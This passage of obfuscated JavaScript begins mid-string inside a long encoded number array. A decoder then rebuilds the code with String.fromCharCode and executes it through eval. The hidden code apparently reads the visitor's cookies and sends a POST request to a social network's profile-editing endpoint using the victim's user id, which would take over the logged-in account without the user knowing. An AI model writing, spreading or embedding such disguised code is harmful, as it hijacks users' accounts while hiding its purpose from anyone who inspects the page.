1519F1567A1623A1615C1879F1863E1791B1831A1775E1271A1279B1423F1031F1207A1207A1207E1207A1207B1207A1207B1207D1207F1207A1207B1207D1207B1207E1207E1207C1207F1207C1207C1207F1207E1207E1207D1207D1951F1759E1815F1871C1759F1207C1791B1767A1271F1743C1791C1831A1871E1783A1879B1823D1815A1319D1775D1759D1879B1503A1815A1759A1823A1759B1831C1879B1871A1479E1919F1623E1727A1775E1575B1727F1823C1759E1271D1223E1871D1759B1815F1759F1743F1879A1223E1279A1679A1335A1695D1319A1895B1727B1815B1887E1759B1207F1439E1439C1207A1223C1351C1223F1279B1935F1031C1207B1207C1207C1207C1207B1207F1207F1207D1207F1207A1207D1207C1207E1207B1207E1207E1207D1207D1207B1207E1207F1207E1207F1207D1751F1839E1743A1887C1823D1759E1831C1879F1319C1743B1839C1839C1807C1791D1759E1207D1439D1207F1223A1743C1791A1831A1871B1223F1207E1295B1207B1887A1871A1759C1863A1711D1791A1751D1207B1295F1207D1223B1439A1759F1863C1807B1759C1807B1423E1759F1911C1847C1791C1863F1759E1871E1439B1223B1207A1295C1207C1735A1879B1727F1863D1791F1783B1791B1319C1879D1839E1519E1567E1623F1615E1879A1863E1791E1831E1775F1271B1279D1423A1031D1207E1207F1207F1207D1207D1207A1207A1207E1207D1207F1207A1207C1207B1207C1207A1207D1207C1207A1207A1207C1207C1207D1207D1207D1951C1031E1207F1207E1207D1207F1207B1207A1207C1207B1207C1207B1207A1207E1207C1207F1207A1207A1207D1207A1207D1207B1207B1207E1207A1207B1759B1895B1727D1815F1271F1767B1839A1831F1807D1871E1791A1919D1839D1831D1207E1295C1207A1223F1271A1223A1207C1295C1207E1791E1751B1207D1295B1207C1223C1303A1223A1207C1295E1207A1743A1791E1831F1871D1207E1295B1207A1223F1279E1423E1223D1279E1423A1031F1207D1207B1207C1207B1207C1207C1207B1207F1207D1207F1207C1207E1207B1207A1207E1207A1207E1207C1207B1207A1207C1207E1207A1207B1951F1031A1207E1207B1207B1207A1207D1207B1207C1207F1951B1423C1031B1207F1207D1207A1207C1207B1207C1207C1207A1207D1207E1207D1207C1207C1207B1207E1207A1911A1823B1815E1783C1879C1879C1847F1319C1839C1847F1759E1831B1271A1223F1519B1503E1623E1223E1303F1207B1223F1327A1727D1799A1727E1911D1327E1879F1791F1823C1759A1815D1791E1831E1759A1327F1759E1751E1791B1879F1711C1847B1863E1839A1767A1791A1815B1759F1327E1735A1727D1871A1791D1743C1711D1791E1831A1767E1839F1319C1847B1783D1847D1455D1711E1711E1727B1439C1343C1255E1711F1711D1887F1871A1759D1863F1439C1223F1207F1295E1207D1887B1871F1759D1863D1711D1791F1751B1303C1207B1879A1863C1887D1759C1279B1423F1031F1207D1207B1207D1207C1207E1207D1207C1207A1207A1207C1207D1207A1207C1207C1207A1207B1911A1823C1815A1783A1879A1879A1847C1319D1871A1759D1879C1607F1759D1855F1887C1759B1871E1879E1527F1759E1727D1751D1759B1863A1207A1271B1223A1655A1311E1615F1639F1575E1311B1607C1759F1895D1223E1303B1207A1871D1895B1831D1711C1863D1759C1895A1279C1423C1031F1207C1207C1207C1207B1207D1207A1207B1207A1207E1207A1207C1207F1207C1207B1207D1207C1911F1823C1815D1783E1879B1879B1847A1319D1871B1759A1831D1751C1271C1279D1423D1031D1951E';var _7405=/[\x41\x42\x43\x44\x45\x46]/;var _2449=2;var _1989=_6325.charAt(_6325.length-1);var _6639;var _8395=_6325.split(_7405);var _5784=[String.fromCharCode,isNaN,parseInt,String];_8395[1]=_5784[_2449+1](_5784[_2449](_8395[1])/21);var _6540=(_2449==5)?String:eval;_6639='';_11=_5784[_2449](_8395[0])/_5784[_2449](_8395[1]);for(_9357=3;_9357<_11;_9357++)_6639+=(_5784[_2449-2]((_5784[_2449](_8395[_9357])+_5784[_2449](_8395[2])+_5784[_2449](_8395[1]))/_5784[_2449](_8395[1])-_5784[_2449](_8395[2])+_5784[_2449](_8395[1])-1));var _7112='_4044';var _7890='_7112=_6639';function _3294(_2130){_6540(_2197);_3294(_6566);_6566(_7890);_3294(_7112);}var _2197='_3294=_6540';var _6566='_6566=_3294';_3294(_1989);